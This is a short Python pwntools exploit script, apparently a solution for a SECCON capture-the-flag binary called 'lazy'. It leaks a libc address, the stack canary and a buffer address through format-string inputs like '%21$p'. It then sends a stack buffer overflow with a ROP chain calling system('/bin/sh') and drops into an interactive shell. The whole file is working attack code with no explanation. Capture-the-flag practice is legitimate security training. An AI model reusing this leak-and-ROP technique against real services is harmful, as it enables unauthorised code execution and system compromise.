from pwn import *
import sys

if sys.argv[1] == "1" : 
	p = process("./lazy")
	offset = 0x20830
else :
	p = remote("lazy.chal.seccon.jp",33333)
	offset = 0x20730
	system = 0x000000000003F570
	binsh = 0x0000000000163C38


prdi = 0x00000000004015f3
prsir15 = 0x00000000004015f1


p.sendlineafter(":","2")
p.sendlineafter(":","_H4CK3R_")
p.sendlineafter(":","3XPL01717")

p.sendlineafter(":","4")
p.sendlineafter(":","%21$p")
p.recvuntil("Filename :")

libc = int(p.recvline()[:-1],16) - offset

print hex(libc)

p.sendlineafter(":","4")
p.sendlineafter(":","%17$p")
p.recvuntil("Filename :")

canary = int(p.recvline()[:-1],16)

print hex(canary)


p.sendlineafter(":","4")
p.sendlineafter(":","%p")
p.recvuntil("Filename :")

filename = int(p.recvline()[:-1],16)

print hex(filename)

pay = "A"*0x60+ p64(0x0000000000602048+0x500) + p64(prdi) + p64(libc+binsh) + p64(libc+system)

p.sendlineafter(":","2")
p.sendlineafter("username :",pay)
p.sendlineafter(":","a")

p.sendlineafter("password\n","/bin/cat cat")


p.interactive()
